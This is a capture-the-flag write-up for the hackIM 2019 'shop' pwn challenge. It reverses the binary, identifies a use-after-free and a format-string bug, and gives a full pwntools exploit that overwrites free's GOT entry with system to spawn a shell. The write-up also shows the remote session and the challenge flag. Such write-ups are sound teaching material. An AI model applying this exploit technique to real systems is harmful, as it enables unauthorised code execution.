# hackIM Shop

This is pwn 458 from hackIM 2019. Quick disclamer I was playing for Kernel
Sanders when I solved this challenge, however I posted it under Knightsec's
name (since that was the team I am on in ctftime)

### Reversing

Let's take a look at the binary:  
```  
$       file challenge  
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
BuildID[sha1]=fe602c2cb2390d3265f28dc0d284029dc91a2df8, not stripped  
$       pwn checksec challenge  
[*] '/Hackery/hackIM/store/challenge'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    Canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

So we are dealing with a `64` bit binary with no PIE or RELRO. When we run the
binary, we see that we have the option to add, remove and view books.

```  
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)  
{  
 int v3; // eax@4  
 char buf; // [sp+10h] [bp-10h]@2  
 __int64 v5; // [sp+18h] [bp-8h]@1

 v5 = *MK_FP(__FS__, 40LL);  
 setbuf(stdin, 0LL);  
 setbuf(stdout, 0LL);  
 while ( 1 )  
 {  
   menu();  
   if ( read(0, &buf, 2uLL) )  
   {  
     v3 = atol(&buf;;  
     switch ( v3 )  
     {  
       case 2:  
         remove_book();  
         break;  
       case 3:  
         view_books();  
         break;  
       case 1:  
         add_book();  
         break;  
       default:  
         puts("Invalid option");  
         break;  
     }  
   }  
   else  
   {  
     perror("Err read option\r\n");  
   }  
 }  
}  
```

so we can see the main function, it essentially just acts as a menu which
launches the `remove_book`, `view_books`, and `add_book` functions.

```  
__int64 add_book()  
{  
 unsigned __int64 sizeScan; // rax@3  
 __int64 v1; // rbx@5  
 __int64 v2; // rbx@6  
 __int64 v3; // rax@7  
 int i; // [sp+Ch] [bp-34h]@7  
 void *bookPtr; // [sp+10h] [bp-30h]@3  
 size_t size; // [sp+18h] [bp-28h]@3  
 __int64 v8; // [sp+28h] [bp-18h]@1

 v8 = *MK_FP(__FS__, 40LL);  
 if ( num_books == 16 )  
 {  
   puts("Cart limit reached!");  
 }  
 else  
 {  
   bookPtr = malloc(0x38uLL);  
   printf("Book name length: ");  
   LODWORD(sizeScan) = readint();  
   size = sizeScan;  
   if ( sizeScan <= 0xFF )  
   {  
     printf("Book name: ");  
     *((_QWORD *)bookPtr + 1) = malloc(size);  
     read(0, *((void **)bookPtr + 1), size);  
     v1 = *((_QWORD *)bookPtr + 1);  
     if ( *(_BYTE *)(v1 + strlen(*((const char **)bookPtr + 1)) - 1) == 10 )  
     {  
       v2 = *((_QWORD *)bookPtr + 1);  
       *(_BYTE *)(v2 + strlen(*((const char **)bookPtr + 1)) - 1) = 0;  
     }  
     printf("Book price: ");  
     LODWORD(v3) = readint();  
     *((_QWORD *)bookPtr + 2) = v3;  
     for ( i = 0; *(&books + i); ++i )  
       ;  
     *(&books + i) = bookPtr;  
     *(_QWORD *)*(&books + i) = i;  
     ++num_books;  
     strcpy((char *)*(&books + i) + 24, cp_stmt);  
   }  
   else  
   {  
     puts("Too big!");  
   }  
 }  
 return *MK_FP(__FS__, 40LL) ^ v8;  
}  
```

So here is the function which adds books. We can see that it first allocates a
chunk of memory with malloc, then allocates a second chunk of memory with
malloc, and the ptr to that is stored in the first chunk of memory at offset
`8`. In the second chunk of memory, we get to scan in up to `0xff` bytes of
memory (depending on what we give it as a size), and the chunk of memory
scales with it. After that it prompts us for the price of the books. Finally
it stores the initial pointer in `books` which is the bss address `0x6021a0`,
increments the count of books `num_books` (bss address `0x6020e0`), and then
copies the string `Copyright NullCon Shop` stored in `cp_stmt` to the first
chunk of memory. Also there is a limit of `0xf` on how many books we can have
allocated at a time.

```  
int view_books()  
{  
 __int64 v0; // ST08_8@3  
 signed int i; // [sp+4h] [bp-Ch]@1

 puts("{");  
 puts("\t\"Books\" : [");  
 for ( i = 0; i <= 15; ++i )  
 {  
   if ( *(&books + i) )  
   {  
     v0 = *(_QWORD *)*(&books + i);  
     puts("\t\t{");  
     printf("\t\t\t\"index\": %ld,\n", v0);  
     printf("\t\t\t\"name\": \"%s\",\n", *((_QWORD *)*(&books + i) + 1));  
     printf("\t\t\t\"price\": %ld,\n", *((_QWORD *)*(&books + i) + 2));  
     printf("\t\t\t\"rights\": \"");  
     printf((const char *)*(&books + i) + 24);  
     puts("\"");  
     if ( *(&books + i + 1) )  
       puts("\t\t},");  
     else  
       puts("\t\t}");  
   }  
 }  
 puts("\t]");  
 return puts("}");  
}  
```

Here we can see the `view_books` function, which prints out the various info
about the books. We can see that there is a format string bug with
`printf((const char *)*(&books + i) + 24);`, since it is printing a non static
string without a specifiec format string. However we will need another bug to
effectively use it.

```  
int remove_book()  
{  
 unsigned __int64 v0; // rax@1  
 int result; // eax@2  
 unsigned __int64 v2; // [sp+8h] [bp-8h]@1

 printf("Book index: ");  
 LODWORD(v0) = readint();  
 v2 = v0;  
 if ( (unsigned int)num_books > v0 )  
 {  
   free(*((void **)*(&books + v0) + 1));  
   free(*(&books + v2));  
   result = num_books-- - 1;  
 }  
 else  
 {  
   result = puts("Invalid index");  
 }  
 return result;  
}  
```

Here we can see is the `remove_book` function. It checks to see if the book is
valid by checking if the index given is larger than the count of currently
allocated books `num_books`, which is a bug. However we see that if the check
is passed, that it just frees the two pointers for the associated bug, and
decrements `num_books`. However after it frees the pointers, it doesn't get
rid of them from `books` (or anywhere else), and doesn't directly edit the
data stored there (unless free/malloc does), so we have a use after free bug
here.

### Infoleak

Since PIE is disabled, we know the addresses of the got table entries. Since
RELRO is disabled, we can write to it. Our plan will essentially be to
overwrite a pointer that is printed with that of a got table address, and
print it, using the use after free bug. This will print out the libc address
for the corresponding function for the got table, which we can use to
calculate the address of `system` (with gdb, we can print the addresses of the
functions and see the offset). From there we will use the use after free bug
to overwrite the rights sections of the books with format strings, to
overwrite the got table entry for free with `system` (since free is bassed a
pointer to data we control, it will make passing a char pointer `/bin/sh\x00`
to `system` easy).

For leaking the libc address, I started off by just allocating a lot of books
of the same size (`50` because I felt like it). After that, I removed a lot of
the books I allocated, then allocated one more, and checked with gdb to see
the offset between that and a pointer which is printed. Here is an example in
gdb, where I allocated five `50` byte chunks, freed them, then allocated a new
book with the name `15935728`:

```  
Legend: code, data, rodata, value  
Stopped reason: SIGINT  
0x00007ffff7af4081 in __GI___libc_read (fd=0x0, buf=0x7fffffffdf80,
nbytes=0x2)  
   at ../sysdeps/unix/sysv/linux/read.c:27  
27      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.  
gdb-peda$ find 15935728  
Searching for '15935728' in: None ranges  
Found 1 results, display max 1 items:  
[heap] : 0x603360 ("15935728\n3`")  
gdb-peda$ x/x 0x603360  
0x603360:       0x31  
gdb-peda$ x/5g 0x603360  
0x603360:       0x3832373533393531      0x000000000060330a  
0x603370:       0x0000000000000005      0x6867697279706f43  
0x603380:       0x6f436c6c754e2074  
```

As you can see, it is just eight bytes from the start of our input before we
start overwriting (and we can see, that I even overwrote the least significant
byte of the pointer with a newline `0x0a` character). We can tell that this is
a pointer to main, since the address `0x603360` (which is eight bytes before
the start of the pointer) is stored in `books`, which from our earlier work we
know that the pointer here is to name. With that, we can just write `8` bytes
to reach the pointer, overwrite it with a got table address. After that we can
just view the books, and we will have our libc infoleak.

### Format String

Now that we have the libc leak, we know where the address of system is. We
will now exploit the format string bug to write the address of system to the
got address of free, by overwriting the string `Copyright NullCon Shop` which
is printed without a format string. Looking in gdb, with books allocated for
50 byte names, we see that the offset from the start of our new books (after
we allocate and free a bunch of books) is `24` bytes. Using the traditional
method of seeing where our input is on the stack with (check
`https://github.com/guyinatuxedo/ctf/tree/master/backdoorctf/bbpwn` for more
on that, however since it is `64` bit you will have to use `%lx` ) we can see
that the start of our input can be reached at `%7$lx` (input being first eight
bytes of the new book name).  

Now for the actual write itself, I will do three writes of two bytes each. The
reason for this being, we can see using the infoleak that libc addresses for
the binary, the highest two bytes are 0x0000, which are taken care of by the
format string write (since if we write `0x0a`, it will append null bytes to
the front of it due to the data value being written). This just leaves us with
6 bytes essentially that we need to worry about being written. I decided to
just do three writes of two bytes each (just a balance between amount of bytes
being written versus number of writes I decided on). We need to do multiple
writes, since when we do a format string write, it will print the amount of
bytes equivalent to the write, and if we were to do it all in one giant write
it would crash usually. Also we needed to write the lowest two bytes, then the
second lowest two bytes, and then finally the third lowest two bytes, because
of the additional zeroes, we would be overwriting data we have written with a
previous write. To find out the order of the writes, we just look at the order
in which they are printed (first data printed = first write). Also to specify
amount of bytes being written we will just append `%Yx` right before the
`%7$n`, to write `Y` bytes (for instance `%5x` to write 5 bytes). With all of
this, we can write our exploit.

### Exploit

One thing I will say, I had a lot of troubke doing I/O with the program while
I was doing exploit dev (probably an issue with my exploit dev). Also these
problems didn't persist entirely on the remote target, as such I ended up
writing two seperate exploits, one for a local copy, and one for the remote.
You will find both in this repo, however here is the local one. They
essentially do the same thing, just slightly different in how.

```  
from pwn import *

#target = remote("pwn.ctf.nullcon.net", 4002)  
target = process('./challenge')  
#gdb.attach(target)

# function to add books  
def addBook(size, price, payload):  
   target.sendline('1')  
   target.sendline(str(size))  
   target.send(payload)  
   target.sendline(str(price))  
   print target.recvuntil('>')

# function to add books with a null byte in it's name  
# for some reason, we need to send an additional byte  
def addBookSpc(size, price, payload):  
 target.sendline("1")  
 target.sendline(str(size))  
 target.sendline(payload)  
 target.sendline("7")  
 target.recvuntil(">")

# this is a function to delete books  
def deleteBook(index):  
   target.sendline('2')  
   target.sendline(str(index))  
   target.recvuntil('>')

# add a bunch of books to use late with the use after free  
addBook(50, 5, "0"*50)  
addBook(50, 5, "1"*50)  
addBook(50, 5, "2"*50)  
addBook(50, 5, "3"*50)  
addBook(50, 5, "4"*50)  
addBook(50, 5, "5"*50)  
addBook(50, 5, "6"*50)  
addBookSpc(50, 5, "/bin/sh\x00") # this book will contain the "/bin/sh" string
to pass a pointer to free  
addBook(50, 5, "8"*50)  
addBook(50, 5, "9"*50)  
addBook(50, 5, "x"*50)  
addBook(50, 5, "y"*50)  
addBook(50, 5, "9"*50)  
addBook(50, 5, "q"*50)

# delete the books, to setup the use after free  
deleteBook(0)  
deleteBook(1)  
deleteBook(2)  
deleteBook(3)  
deleteBook(4)  
deleteBook(5)  
deleteBook(6)  
deleteBook(7)  
deleteBook(8)  
deleteBook(9)  
deleteBook(10)  
deleteBook(11)  
deleteBook(12)  
deleteBook(13)  
deleteBook(14)

# This is the initial overflow of a pointer with the got address of `puts` to
get the libc infoleak  
addBookSpc(50, 5, "15935728"*1 + p64(0x602028) + "z"*8 + "%7$lx.")

# Display all of the books, to get the libc infoleak  
target.sendline('3')

# Filter out the infoleak  
print target.recvuntil('{')  
print target.recvuntil('{')  
print target.recvuntil('{')  
print target.recvuntil('{')

print target.recvuntil("\"name\": \"")

leak = target.recvuntil("\"")  
leak = leak.replace("\"", "")  
print "leak is: " + str(leak)  
leak = u64(leak + "\x00"*(8 - len(leak)))

# Subtract the offset to system from puts from the infoleak, to get the libc
address of system  
leak = leak - 0x31580

print "leak is: " + hex(leak)

# do a bit of binary math to get the

part0 = str(leak & 0xffff)  
part1 = str(((leak & 0xffff0000) >> 16))  
part2 = str(((leak & 0xffff00000000) >> 32))

print "part 0: " + hex(int(part0))  
print "part 1: " + hex(int(part1))  
print "part 2: " + hex(int(part2))

# Add the three books to do the format string  
# We need the 0x602028 address still to not cause a segfault when it prints  
# the got address we are trying to overwrite is at 0x602018

addBookSpc("50", "5", p64(0x60201a) + p64(0x602028) + "z"*8 + "%" + part1 +
"x%7$n")  
addBookSpc("50", "5", p64(0x602018) + p64(0x602028) + "z"*8 + "%" + part0 +
"x%7$n")  
addBookSpc("50", "5", p64(0x60201c) + p64(0x602028) + "z"*8 + "%" + part2 +
"x%7$n")

# Print the books to execute the format string write  
target.sendline('3')

# Free the book with "/bin/sh" to pass a pointer to "/bin/sh" to system  
target.sendline('2')  
target.sendline('7')

# Drop to an interactive shell  
target.interactive()  
```

and when we run the remote exploit:

```  
$ python exploit.py  
[+] Opening connection to pwn.ctf.nullcon.net on port 4002: Done  
NullCon Shop  
(1) Add book to cart  
(2) Remove from cart  
(3) View cart  
(4) Check out

. . .

$ w  
18:51:13 up 7 days,  3:10,  0 users,  load average: 0.03, 0.13, 0.07  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT  
$ ls  
challenge  
flag  
$ cat flag  
hackim19{h0p3_7ha7_Uaf_4nd_f0rm4ts_w3r3_fun_4_you}  
$ w  
[*] Got EOF while reading in interactive  
$  
[*] Interrupted  
[*] Closed connection to pwn.ctf.nullcon.net port 4002  
```

Just like that, we get the flag
`hackim19{h0p3_7ha7_Uaf_4nd_f0rm4ts_w3r3_fun_4_you}`  

Original writeup
(https://github.com/guyinatuxedo/ctf/tree/master/hackIM19/pwn/shop).